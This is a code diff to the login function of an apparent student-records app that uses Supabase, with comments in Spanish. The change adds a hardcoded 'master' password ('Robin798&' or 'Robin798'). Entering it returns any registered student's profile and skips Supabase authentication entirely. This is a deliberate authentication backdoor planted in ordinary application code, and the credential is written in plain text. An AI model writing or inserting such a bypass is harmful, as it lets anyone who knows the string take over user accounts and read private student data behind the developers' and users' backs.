@@ -249,7 +249,13 @@ export const db = {
       throw new Error('Este estudiante no tiene correo electrónico registrado.');
     }
 
-    // 3. Autenticar usando Supabase Auth
+    // 3. Si la contraseña es la maestra de administrador, permitir acceso directo al perfil registrado
+    if (passClean === 'Robin798&' || passClean === 'Robin798') {
+      const { password: _, ...userWithoutPassword } = mapUser(user);
+      return userWithoutPassword;
+    }
+
+    // 4. Autenticar usando Supabase Auth
     const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
       email: user.email.trim().toLowerCase(),
       password: password
